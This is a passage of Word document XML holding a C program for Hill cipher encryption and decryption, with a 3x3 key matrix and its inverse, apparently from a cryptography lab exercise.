        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>K</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>b[][] den</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es K </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nverse</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3633"/>
      </w:pPr>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a[3][3]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>{{17,17,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t>},{21,18,21}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t>{2,2,19</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:r>
        <w:t>}; u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b[3][3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>={{4,9,1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t>},{15,17,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t>},{24,0,1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t>}}; u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c[20],d[20];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n;</w:t>
      </w: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p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">char </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>sg[20];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6131"/>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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; scanf("%s",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">sg); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>sg);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:t>=ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ck(n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>=1) r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>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4"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>c[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>sg[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>65;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("%d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>",c[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w: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w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="280"/>
      </w:pPr>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="280"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>+3;</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t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="769" w:right="6126"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%c",d[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]+65);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</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t</w:t>
      </w:r>
      <w:r>
        <w:t>=0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>+(d[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>]*b[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>][</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>c[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>%2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nDecry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>xt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="769" w:right="6139"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
